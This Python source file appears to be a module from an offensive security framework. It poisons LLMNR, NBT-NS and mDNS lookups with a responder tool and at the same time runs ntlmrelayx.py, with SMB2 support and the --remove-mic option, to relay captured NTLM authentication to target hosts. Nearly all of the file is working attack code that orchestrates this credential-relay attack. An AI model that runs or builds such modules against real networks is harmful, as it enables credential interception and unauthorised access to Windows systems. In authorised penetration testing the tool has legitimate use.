import os
import asyncio
import shlex

from module import BaseModule
from tool import Tool

class ResponderRelay(BaseModule):
    path = "responder/relay"
    description = "Poison LLMNR, NBT-NS and mDNS lookups and relay authentication requests"
    options = {
        "iface": {"default": "eth0", "description": "Interface to listen on", "required": True},
        "targets": {"default": "", "description": "Relay targets", "required": True}
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    @staticmethod
    def _is_running_as_root() -> bool:
        if hasattr(os, "geteuid"):
            return os.geteuid() == 0
        if hasattr(os, "getuid"):
            return os.getuid() == 0
        return False

    async def run(self):
        os.chdir(self.logs_dir)
        try:
            if not self.validate_options():
                return

            if not self._is_running_as_root():
                self.pane_a.write(
                    "[red][!] Please run as root to use MiniResponder.[/red]"
                )
                return

            os.chdir(self.logs_dir)
            tool = Tool(self)

            target_option = '-tf' if os.path.exists(self.opts.targets) else '-t'
           
            async def _run_miniresponder():
                tool.set_output_pane(self.pane_b)
                await tool.miniresponder(self.opts.iface, respond_only=True)

            async def _run_relay():
                cmd = [
                    "../tools/.bin/ntlmrelayx.py",
                    target_option,
                    self.opts.targets,
                    "-smb2support",
                    "--no-http-server",
                    "--no-raw-server",
                    "--no-wcf-server",
                    "--remove-mic",
                ]
                async for line in self.run_command(shlex.join(cmd), self.pane_c):
                    self.pane_c.write(line)

            await asyncio.gather(
                _run_miniresponder(),
                _run_relay()
            ) 

        except Exception as e:
            self.pane_b.write(f"[red]Error in module:[/red] {str(e)}")
            self.pane_c.write(f"[red]Error in module:[/red] {str(e)}")
